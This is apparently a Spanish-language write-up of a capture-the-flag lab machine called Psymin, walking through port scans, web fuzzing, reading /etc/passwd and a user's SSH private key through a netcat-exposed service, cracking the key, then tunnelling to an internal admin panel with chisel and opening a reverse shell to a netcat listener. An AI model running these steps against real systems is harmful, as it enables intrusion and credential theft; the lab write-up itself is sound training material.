# Máquina Psymin

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.135

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,3000 -vvv -Pn 192.168.5.135

![alt text](image-2.png)

### Fuzing web

feroxbuster --url http://192.168.5.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

No se encontró nada interesante

### Explotación

Me conecto con netcat:

nc 192.168.42.182 3000

con la función echo file_get_contents veo el archivo /etc/passwd

![alt text](image-3.png)

ahora como encontré el usuario alfred, busco el id_rsa

echo file_get_contents('/home/alfred/.ssh/id_rsa');

![alt text](image-4.png)

copio el id_rsa le doy permisos 600 y lo crackeo con la herramienta RSAcrack

![alt text](image-5.png)

ahora me conecto mediante ssh

![alt text](image-6.png)


### Escalar privilegios

ejecuté el comando ss -tuln

![alt text](image-7.png)

entonce hago la técnico port forwarding

descargo el binario chisel tanto en la máquina víctima como en la del atacante:

en mi máquina atacante:

./chisel server -p 443 --reverse

en víctima:

./chisel client 192.168.5.131:443 R:8080:127.0.0.1:10000

![alt text](image-8.png)

entonces coloco las credenciales root:root

![alt text](image-9.png)

me dirijo a tools y luego a commad shell

![alt text](image-10.png)

me pongo al escucha con netcat en el puerto 1234

y ejecuto el comando en la web

![alt text](image-11.png)

![alt text](image-12.png)

### user.txt

![alt text](image-13.png)

### root.txt

![alt text](image-14.png)
